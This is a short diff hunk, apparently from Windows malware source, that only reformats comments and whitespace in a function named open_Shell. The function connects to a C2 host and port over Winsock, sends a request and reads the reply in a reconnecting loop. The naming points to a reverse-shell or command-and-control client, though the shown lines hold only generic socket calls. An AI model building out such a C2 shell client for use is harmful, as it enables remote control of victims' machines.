@@ -68,11 +68,11 @@ void open_Shell(char *C_2, int C_2port) {
             WSACleanup();                                   // Ends socket operations. Deregistering Win Sock DLL from implementations to free resources.
             continue;                                       // After closing socket, repeat loop.
         }
-        else {                                                                     // Connections successful.
-            send(sock, http_Request, (strlen(http_Request)+1), 0);       //
-            char recv_Data[DEF_BUFLEN];                                            // Variable for data receival.
+        else {                                                                    // Connections successful.
+            send(sock, http_Request, (strlen(http_Request)+1), 0);                
+            char recv_Data[DEF_BUFLEN];                                           // Variable for data receival.
             memset(recv_Data, 0, sizeof(recv_Data));
-            int recv_bytes = recv(sock, recv_Data, DEF_BUFLEN, 0);           // receive a messages length from the connected socket.
+            int recv_bytes = recv(sock, recv_Data, DEF_BUFLEN, 0);                // receive a messages length from the connected socket.
             if (recv_bytes <= 0) {                                                // Socket is not connected if a message is received with 0 length. Restart the loop.
                 closesocket(sock);
                 WSACleanup();
